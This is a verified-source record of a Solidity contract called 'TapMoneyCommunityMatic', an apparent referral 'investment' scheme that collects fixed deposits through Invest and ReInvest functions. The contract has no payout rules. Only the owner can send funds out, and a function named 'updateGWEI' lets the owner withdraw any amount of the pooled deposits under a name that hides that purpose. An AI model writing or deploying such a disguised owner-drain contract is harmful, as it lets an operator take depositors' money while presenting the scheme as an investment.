{"SourceCode": "//SPDX-License-Identifier: None\r\npragma solidity ^0.6.0;\r\ncontract TapMoneyCommunityMatic {\r\n    struct User {\r\n        uint id;\r\n        address referrer;\r\n    }  \r\n    mapping(address => User) public users;\r\n    uint public lastUserId = 2;\r\n    \r\n    address public id1=0x380904E357688626aBe844A44d4134Acbe2462FD;\r\n    address feeWallet1=0x4806994a494Bc6Bf12AbB6335F0CAc353753783d;\r\n    address feeWallet2=0x5392825E4e5722Dd0A3c3ACb26b4f8EA03b6D6BA;\r\n    address owner;\r\n    mapping(uint8 => uint) public packagePrice;  \r\n    event Registration(address indexed user, address indexed referrer,uint8 level);\r\n    event Upgrade(address indexed user, uint8 level);\r\n    event withdraw(address indexed user,uint256 value);\r\n    \r\n    constructor(address _owner) public {   \r\n        owner=_owner;\r\n        User memory user = User({\r\n            id: 1,\r\n            referrer: address(0)\r\n        });\r\n        users[id1] = user;\r\n        packagePrice[1] = 5e18;\r\n        packagePrice[2] = 50e18;\r\n        packagePrice[3] = 100e18;\r\n        packagePrice[4] = 55e18;\r\n    }\r\n    function Invest(address referrerAddress,uint8 level) external payable {\r\n        require(msg.value == packagePrice[level], \"less than min\");\r\n        require(level == 1 || level == 4, \"invalid level\");\r\n        registration(msg.sender, referrerAddress,level);\r\n    }\r\n    function ReInvest(uint8 level) external payable{\r\n        \r\n        require(msg.value == packagePrice[level], \"less than min\");\r\n        require(level == 2 || level == 3, \"invalid level\");\r\n        buyNewLevel(msg.sender,level);\r\n    }\r\n    function buyNewLevel(address userAddress,uint8 level) private {\r\n        require(isUserExists(userAddress), \"user is not exists. Register first.\");\r\n        emit Upgrade(userAddress,level);\r\n    }\r\n    \r\n    function registration(address userAddress, address referrerAddress,uint8 level) private {\r\n        require(!isUserExists(userAddress), \"user exists\");\r\n        require(isUserExists(referrerAddress), \"referrer not exists\");\r\n\r\n        User memory user = User({\r\n            id: lastUserId,\r\n            referrer: referrerAddress\r\n        });\r\n        \r\n        users[userAddress] = user;\r\n        users[userAddress].referrer = referrerAddress;        \r\n        lastUserId++;\r\n        emit Registration(userAddress, referrerAddress,level);\r\n    }\r\n    \r\n    function isUserExists(address user) public view returns (bool) {\r\n        return (users[user].id != 0);\r\n    }\r\n    function Withdraw(address _user,uint256 _payout,uint _fee) public\r\n    {\r\n        require(msg.sender==owner,\"Only contract owner\"); \r\n        payable(_user).transfer(_payout);  \r\n        payable(feeWallet1).transfer(_fee);\r\n        payable(feeWallet2).transfer(_fee); \r\n        emit withdraw(_user,_payout);\r\n    }\r\n    function updateGWEI(uint256 _amount) public\r\n    {\r\n        require(msg.sender==owner,\"Only contract owner\"); \r\n        require(_amount>0, \"Insufficient reward to withdraw!\");\r\n        payable(msg.sender).transfer(_amount);  \r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Registration\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Upgrade\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrerAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"Invest\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"level\",\"type\":\"uint8\"}],\"name\":\"ReInvest\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_payout\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_fee\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"id1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"isUserExists\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lastUserId\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"packagePrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"updateGWEI\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TapMoneyCommunityMatic", "CompilerVersion": "v0.6.12+commit.27d51765", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000238b5bee446d8c4c83eef7ab58c4b8aa6d664269", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://aae46aac5fcbb7c9537547dc2ca423671426e774a957094c5e515ebe641baef9"}